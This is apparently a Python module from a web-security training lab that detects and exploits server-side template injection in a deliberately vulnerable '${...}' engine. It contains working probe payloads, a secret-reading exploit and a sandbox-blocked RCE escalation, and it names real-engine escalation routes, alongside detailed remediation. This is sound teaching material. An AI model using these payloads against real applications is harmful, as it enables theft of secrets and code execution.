"""Advanced Server-Side Template Injection -- the ``${ ... }`` engine variant.

WHAT IT IS
----------
This is Server-Side Template Injection again, but against a DIFFERENT engine than
the WEB-200 module (:mod:`weblab.ssti`, which targets a Jinja-style ``{{ ... }}``
engine). Many real-world template / expression engines use the ``${ ... }`` (a.k.a.
"dollar-brace") delimiter instead of double-mustache: JSP EL and the Java Unified
EL (``${...}`` in JSF/Spring), Spring's SpEL (``#{...}``/``${...}``), Apache
FreeMarker (``${...}``), Thymeleaf preprocessing (``__${...}__``), JavaScript
template literals, and Velocity-adjacent syntaxes. An attacker probing an unknown
app tries BOTH delimiter families precisely because the vulnerable surface --
*untrusted input concatenated into a template string that is then rendered* --
looks identical regardless of which engine sits underneath; only the syntax that
"lights up" differs. The demo app's ``GET /tpl?name=`` handler is the textbook
shape::

    def _tpl(h):                                          # GET /tpl?name=<v>
        name = h._query().get("name", "Guest")            # attacker-controlled
        out = _render_dollar(f"Hello {name}!", {...})      # input *becomes* template
        h._send(200, f"<p>{out}</p>")                      # then it's EVALUATED

Because ``name`` is spliced into the template *before* rendering, any ``${expr}``
the attacker supplies is evaluated by the ``${...}`` engine. A benign ``name=World``
renders ``Hello World!``; ``name=${7*7}`` renders ``Hello 49!`` -- the server did
arithmetic the user never wrote out, proving the input crossed from data into code.
From there the attacker reads any object the engine exposed (here ``config.secret``,
the planted prize -- in the real world ``SECRET_KEY``, DB URIs, signing tokens) and,
on an unsandboxed engine, walks the object graph through dunder attributes (Python),
``T(java.lang.Runtime)`` (SpEL), or ``freemarker.template.utility.Execute``
(FreeMarker) to reach OS command execution -- full RCE.

This lab's ``${...}`` engine is built on a vetted ``ast`` walk (see
:mod:`weblab.targetapp.ssti_engine`) that PERMITS arithmetic / names / non-dunder
attribute reads but REJECTS calls and dunder access, so the data-leak is genuine
while the RCE escalation is recognised and reported as "blocked by the lab sandbox".
That block is the demo doing the right thing; we record it in ``extra`` and do NOT
treat it as a failure.

HOW WE DISCOVER IT
------------------
We confirm the ``${...}`` sink with layered, differential signals:

1. **The arithmetic fingerprint.** ``name=${7*7}`` returns ``Hello 49!``. A safe
   app -- or one whose engine uses a *different* delimiter -- echoes the literal
   ``${7*7}``; getting the *product* ``49`` back proves THIS engine evaluated our
   ``${...}`` expression. We cross-check with a second sum (``${6*6}`` -> ``36``)
   so a page that merely happened to contain "49" can't fool the detector.
2. **The data-echo control.** ``name=World`` (no ``${}``) comes back verbatim as
   ``Hello World!`` -- proof the parameter is reflected into the page at all (the
   precondition the injection abuses) and that "49" only appears when we ask the
   engine to *compute* it.
3. **Attribute-read confirmation.** ``name=${config.app}`` returns the engine's
   ``config.app`` value (``api-gateway``) -- proof we can read objects the template
   put in scope, exactly the primitive the exploit weaponises.

HOW WE EXPLOIT IT
-----------------
We request ``name=${config.secret}`` and recover the planted secret the template
context exposed: ``C.FLAGS["advanced_ssti"]``. We then DEMONSTRATE the RCE
escalation attempt -- ``name=${''.__class__}`` (the first hop of the Python
object-graph walk to ``os.system``) -- and record that the lab sandbox blocked it
(a vetted ``ast`` walk rejecting dunder access). That block is the demo behaving
correctly; we record it in ``extra`` and do NOT count it as a failure.

THE FIX
-------
See :data:`REMEDIATION`. In one line: never render untrusted input AS a template
(in ANY delimiter family -- ``${...}``, ``{{...}}``, ``#{...}``, ``__${...}__``);
pass it as a *bound variable* to a fixed, pre-compiled template, render in a real
sandbox with autoescaping on, and never expose sensitive objects to the context.
"""
from __future__ import annotations

from typing import Dict, List, Optional, Tuple

from ._types import Finding, Response, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "Never render untrusted input AS a template, in ANY delimiter family. The root "
    "cause is concatenating user data into a template string that is then evaluated "
    "(f\"Hello {name}!\" -> render(...)); the fix is to keep data and code separate. "
    "Define templates as fixed, pre-compiled artifacts and pass user input ONLY as "
    "bound variables to the render call (Jinja render_template('hello.html', name=name); "
    "in Java/JSP use JSTL <c:out value=\"${name}\"/> or set EL_IGNORED so ${...} in data "
    "is inert; in Spring use a parameterised view, never message-format user strings "
    "through SpEL/EL) so the value is substituted as inert text, never parsed as template "
    "syntax. Engines that use ${...}/#{...}/__${...}__ (JSP EL, Java Unified EL, Spring "
    "SpEL, FreeMarker, Thymeleaf, Velocity) are exactly as injectable as Jinja's {{...}} "
    "when fed attacker text -- treat all delimiter families identically. If you MUST "
    "render user-authored templates, run them in a real sandbox (Jinja2 "
    "SandboxedEnvironment; FreeMarker with the new_builtin_class_resolver locked down and "
    "the ?api/Execute utilities removed; SpEL with a SimpleEvaluationContext, never a "
    "StandardEvaluationContext) that forbids attribute access to dunder/reflection "
    "members, builtins, type coercion (T(...)), and arbitrary calls -- and treat the "
    "sandbox as defence-in-depth, not a license to template untrusted input. Keep "
    "autoescaping enabled so any reflected output is HTML-escaped. Crucially, never place "
    "sensitive objects (config, SECRET_KEY, credentials, request/session globals, Runtime) "
    "into the template context where an attribute walk can reach them. Validate/allow-list "
    "any user-controlled template name or path, run the renderer as a least-privilege "
    "process, and prefer logic-less templating for user-supplied content. Separate data "
    "from code, sandbox the engine, and starve the context -- never evaluate a user's string."
)

#: The advanced (``${...}``) SSTI sink, used as the Finding endpoint.
ENDPOINT: str = "/tpl?name="

#: The canonical arithmetic fingerprint for the ``${...}`` engine: ``${7*7}`` -> ``49``
#: proves THIS engine evaluated our expression rather than echoing the literal.
FINGERPRINT_PAYLOAD: str = "${7*7}"
FINGERPRINT_EXPECTED: str = "49"

#: A second, independent arithmetic probe (``${6*6}`` -> ``36``) so a page that merely
#: happens to contain "49" cannot masquerade as a vulnerable ``${...}`` engine.
FINGERPRINT_PAYLOAD_2: str = "${6*6}"
FINGERPRINT_EXPECTED_2: str = "36"

#: A benign, delimiter-free value: it must come back verbatim. The control that proves
#: the parameter is reflected at all (and that "49" only appears when the engine computes it).
BENIGN_VALUE: str = "weblabAdvSSTIprobe"

#: An attribute-read probe: ``${config.app}`` returns the engine's app name (``api-gateway``)
#: -- proof we can read objects the template put in scope (the exploit primitive).
ATTRIBUTE_PROBE: str = "${config.app}"
ATTRIBUTE_EXPECTED: str = "api-gateway"

#: The headline working exploit: read the planted secret out of the template context.
#: ``${config.secret}`` renders ``C.FLAGS["advanced_ssti"]``.
WORKING_PAYLOAD: str = "${config.secret}"

#: The classic Python SSTI RCE escalation. On an unsandboxed engine this walks the object
#: graph (``''.__class__.__mro__[1].__subclasses__()`` ...) to ``os.system``; here the lab
#: sandbox rejects the dunder access and reports a block instead of executing.
RCE_ESCALATION_PAYLOAD: str = "${''.__class__}"

#: The marker the lab sandbox emits when it refuses an escalation attempt.
SANDBOX_BLOCK_MARKER: str = "lab-sandbox blocked RCE escalation"

#: Every payload the engine knows about (public so the CLI / report can show exactly what
#: was attempted): the two arithmetic fingerprints, the data control, the attribute read,
#: the secret-read exploit, and the (blocked) RCE escalation.
PAYLOADS: List[str] = [
    FINGERPRINT_PAYLOAD,
    FINGERPRINT_PAYLOAD_2,
    BENIGN_VALUE,
    ATTRIBUTE_PROBE,
    WORKING_PAYLOAD,
    RCE_ESCALATION_PAYLOAD,
]


# --- low-level probe ---------------------------------------------------------
def _render(client: WebClient, name_value: str) -> Response:
    """Request ``/tpl?name=<name_value>`` (the client URL-encodes the value)."""
    return client.get("/tpl", params={"name": name_value})


def _rendered_text(resp: Response) -> str:
    """Strip the ``<p>Hello ...!</p>`` chrome the demo wraps the render in.

    Returns the inner rendered string so detectors match on the engine's actual
    output rather than the surrounding HTML.
    """
    inner = resp.text
    if "<p>" in inner and "</p>" in inner:
        inner = inner.split("<p>", 1)[1].rsplit("</p>", 1)[0]
    prefix, suffix = "Hello ", "!"
    if inner.startswith(prefix):
        inner = inner[len(prefix):]
    if inner.endswith(suffix):
        inner = inner[: -len(suffix)]
    return inner


# --- detection ---------------------------------------------------------------
def detect_data_reflection(client: WebClient) -> Tuple[bool, str]:
    """True if a benign, delimiter-free value is reflected verbatim into the page.

    The control: ``name=weblabAdvSSTIprobe`` must come back unchanged inside
    ``Hello ...!``. This proves the parameter is reflected at all -- the precondition
    SSTI abuses -- and anchors that any computed value (e.g. "49") only appears when
    we make the engine evaluate it.
    """
    resp = _render(client, BENIGN_VALUE)
    if resp.status == 200 and BENIGN_VALUE in resp.text:
        return True, (
            f"GET {ENDPOINT}{BENIGN_VALUE} reflected the value verbatim "
            f"(HTTP {resp.status}) -- the parameter lands in the rendered page"
        )
    return False, ""


def detect_template_evaluation(client: WebClient) -> Tuple[bool, str]:
    """True if ``${7*7}`` is EVALUATED to ``49`` (cross-checked with ``${6*6}``).

    The arithmetic fingerprint for the ``${...}`` delimiter: a safe app -- or one
    whose engine uses a different delimiter -- echoes ``${7*7}`` literally, so getting
    the product ``49`` back proves THIS engine evaluated our expression. We require a
    *second*, independent sum (``${6*6}`` -> ``36``) so a page that merely happens to
    contain "49" cannot be mistaken for a template engine.
    """
    resp1 = _render(client, FINGERPRINT_PAYLOAD)
    out1 = _rendered_text(resp1)
    ok1 = (
        resp1.status == 200
        and FINGERPRINT_EXPECTED in out1
        and FINGERPRINT_PAYLOAD not in out1
    )

    resp2 = _render(client, FINGERPRINT_PAYLOAD_2)
    out2 = _rendered_text(resp2)
    ok2 = (
        resp2.status == 200
        and FINGERPRINT_EXPECTED_2 in out2
        and FINGERPRINT_PAYLOAD_2 not in out2
    )

    if ok1 and ok2:
        return True, (
            f"GET {ENDPOINT}{FINGERPRINT_PAYLOAD} rendered {FINGERPRINT_EXPECTED!r} "
            f"(and {FINGERPRINT_PAYLOAD_2} -> {FINGERPRINT_EXPECTED_2!r}) -- the "
            "${...} engine evaluated our expression instead of echoing it"
        )
    return False, ""


def detect_attribute_read(client: WebClient) -> Tuple[bool, str]:
    """True if ``${config.app}`` reads an object the template exposed.

    Sends ``name=${config.app}`` and expects the engine's ``config.app`` value
    (``api-gateway``). This proves the attribute-walk primitive works -- exactly the
    read the exploit weaponises to reach ``config.secret``.
    """
    resp = _render(client, ATTRIBUTE_PROBE)
    out = _rendered_text(resp)
    if resp.status == 200 and ATTRIBUTE_EXPECTED in out:
        return True, (
            f"GET {ENDPOINT}{ATTRIBUTE_PROBE} returned {ATTRIBUTE_EXPECTED!r} -- "
            "attribute reads expose objects the template put in scope"
        )
    return False, ""


def detect_rce_blocked(client: WebClient) -> Tuple[bool, str]:
    """Confirm the lab sandbox BLOCKS the classic RCE escalation (the control).

    Sends ``name=${''.__class__}``, the first hop of the Python object-graph walk to
    ``os.system``. The lab's vetted ``ast`` walk rejects the dunder access and emits a
    block marker. A True return means "escalation was *attempted and refused*" -- the
    demo behaving correctly, and NOT counted as a failure of the assessment.
    """
    resp = _render(client, RCE_ESCALATION_PAYLOAD)
    if resp.status == 200 and SANDBOX_BLOCK_MARKER in resp.text:
        return True, (
            f"GET {ENDPOINT}{RCE_ESCALATION_PAYLOAD} was refused by the lab sandbox "
            f"({SANDBOX_BLOCK_MARKER!r}) -- dunder/RCE escalation is blocked, so the "
            "secret leak is the demonstrable impact here"
        )
    return False, ""


# --- exploitation ------------------------------------------------------------
def exploit_read_config_secret(
    client: WebClient, payload: str = WORKING_PAYLOAD
) -> Tuple[bool, Optional[str], str]:
    """Read ``config.secret`` via ``${...}`` SSTI and recover the planted flag.

    Returns ``(ok, flag, rendered_text)``. On success the rendered output is the
    template context's ``config.secret`` -- ``C.FLAGS["advanced_ssti"]`` -- proof we
    read an object the engine exposed.
    """
    resp = _render(client, payload)
    out = _rendered_text(resp)
    if resp.status != 200 or C.FLAGS["advanced_ssti"] not in out:
        return False, None, out
    return True, C.FLAGS["advanced_ssti"], out


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect ``${...}`` server-side template injection, then exploit it.

    Returns a :class:`Finding` whose ``exploit_result`` contains the recovered
    ``C.FLAGS["advanced_ssti"]`` and whose ``extra`` records the RCE-escalation attempt
    being blocked by the lab sandbox (the demo's one correct behaviour).
    """
    techniques: List[str] = []

    # 1) Detection ----------------------------------------------------------
    reflect_ok, reflect_ev = detect_data_reflection(client)
    if reflect_ok:
        techniques.append("data-reflection")
    eval_ok, eval_ev = detect_template_evaluation(client)
    if eval_ok:
        techniques.append("arithmetic-fingerprint")
    attr_ok, attr_ev = detect_attribute_read(client)
    if attr_ok:
        techniques.append("attribute-read")
    rce_blocked, rce_ev = detect_rce_blocked(client)
    if rce_blocked:
        techniques.append("rce-escalation-blocked")

    # 2) Exploitation -------------------------------------------------------
    ok, flag, rendered = exploit_read_config_secret(client)
    if ok:
        techniques.append("read-config-secret")

    # Discovery requires the ${...} engine to have evaluated our expression AND the
    # secret to have been recovered.
    discovered = bool(eval_ok and ok)

    # 3) Assemble evidence / result ----------------------------------------
    evidence_parts: List[str] = []
    if reflect_ok:
        evidence_parts.append(f"reflection: {reflect_ev}")
    if eval_ok:
        evidence_parts.append(f"evaluation: {eval_ev}")
    if attr_ok:
        evidence_parts.append(f"attribute: {attr_ev}")
    if rce_blocked:
        evidence_parts.append(f"rce-block: {rce_ev}")
    evidence = " || ".join(evidence_parts)

    exploit_result = {
        "flag": flag,
        "payload": WORKING_PAYLOAD,
        "delimiter": "${...}",
        "leaked_object": "config.secret",
        "rendered": rendered,
        "fingerprint": f"{FINGERPRINT_PAYLOAD} -> {FINGERPRINT_EXPECTED}",
        "techniques": techniques,
        "summary": (
            f"GET {ENDPOINT}{WORKING_PAYLOAD} rendered the template context's "
            f"config.secret via the ${{...}} engine; recovered flag {flag!r}"
        ),
    }

    return Finding(
        vuln="Advanced Server-Side Template Injection (${...} engine)",
        endpoint=ENDPOINT,
        severity=Severity.CRITICAL.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=WORKING_PAYLOAD,
        extra={
            "techniques": techniques,
            "delimiter": "${...}",
            "distinct_from": "weblab.ssti ({{...}} engine)",
            "fingerprint_payload": FINGERPRINT_PAYLOAD,
            "fingerprint_expected": FINGERPRINT_EXPECTED,
            "fingerprint_payload_2": FINGERPRINT_PAYLOAD_2,
            "fingerprint_expected_2": FINGERPRINT_EXPECTED_2,
            "working_payload": WORKING_PAYLOAD,
            "data_reflection_ok": reflect_ok,
            "template_evaluated": eval_ok,
            "attribute_read_ok": attr_ok,
            "flag_recovered": ok,
            "leaked_object": "config.secret",
            # The RCE escalation: attempted, but refused by the lab sandbox. This is
            # the demo doing the right thing -- NOT an assessment failure.
            "rce_escalation_payload": RCE_ESCALATION_PAYLOAD,
            "rce_escalation_attempted": True,
            "rce_escalation_blocked": rce_blocked,
            "rce_block_marker": SANDBOX_BLOCK_MARKER,
        },
    )
